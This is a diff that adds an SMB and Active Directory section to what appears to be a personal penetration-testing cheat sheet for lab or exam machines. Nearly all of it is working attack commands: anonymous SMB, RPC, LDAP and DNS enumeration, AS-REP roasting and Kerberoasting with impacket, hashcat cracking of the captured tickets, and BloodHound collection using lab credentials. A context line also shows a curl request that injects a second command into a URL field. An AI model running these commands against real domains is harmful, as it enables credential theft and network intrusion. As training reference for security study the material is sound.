@@ -22,6 +22,7 @@
   - [SSH Tunneling](#ssh-tunneling)
 - [Web Attacks](#web-attacks)
   - [Local File Inclusion](#local-file-inclusion)
+- [SMB](#smb)
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   - [Manual Enumeration](#manual-enumeration)
   - [Service Binary Hijacking](#service-binary-hijacking)
@@ -374,7 +375,103 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
 ```bash
 # Local File Inclusion...
 wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py
+```
 
+## Web
+```bash
+# nmap
+nmap 10.10.10.175 --script=smb-enum* -p445
+
+#crackmapexec(smb/winrm)
+crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
+crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
+crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
+crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
+
+
+# rdesktop
+rdesktop 192.168.216.165
+
+
+# smbclient
+## anon
+smbclient -L 10.10.10.175 -N
+smbclient -L 10.10.10.175 -U "Egotistical-bank.local/fsmith"
+smbclient "\\\\10.10.10.175\\RICOH Aficio SP 8300DN PCL 6" -U "Egotistical-bank.local/fsmith"
+
+> recurse on
+> prompt off
+> ls
+
+
+# dns
+dig @10.10.10.161 AXFR htb.local
+
+
+# smbmap
+smbmap -H 10.10.10.161
+smbmap -H 10.10.10.10 -u '' -p ''
+smbmap -H 10.10.10.10 -u 'guest' -p ''
+smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.193.5
+
+
+# enum4linux
+enum4linux -a -u "" -p "" dc-ip
+enum4linux -a -u "guest" -p "" dc-ip
+
+
+# rpcclient
+## anon
+rpcclient 10.10.10.175 -N
+rpcclient -U "" -N 10.10.10.161
+> enumdomusers
+> enumdomgroups
+
+
+# LDAP
+## anon
+ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"
+
+
+# kerbrute
+## anon
+kerbrute.py -users ./users.txt -dc-ip 192.168.10.175 -domain oscp.exam
+
+
+# GetNPUsers.py(18200)
+## anon
+### without providing anything.
+impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/
+GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
+GetNPUsers.py active.htb/ -dc-ip 10.10.10.100
+
+
+### with usernames.txt
+impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+
+### with username whos "Do not require Kerberos preauthentication" is enabled (## This will get us dave's TGT if his pre-authentication)
+impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/dave -no-pass
+impacket-GetNPUsers Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass
+impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %> -request -no-pass -dc-ip <% tp.frontmatter["RHOST"] %>
+
+### with valid credentials(pete/Nexus123!) this will return a user's TGT ticket whos "Do not require Kerberos preauthentication" is enabled.
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete (#this requires pete's password for us to be able to get dave's TGT)
+
+### with username list
+impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/ -usersfile usernames.txt
+GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
+
+
+# Kerberoast(requires valid credentials) 13100
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+
+
+## hashcat
+hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+# bloodhound
+bloodhound-python --dns-tcp -ns 10.129.193.5 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
 ```
 
 
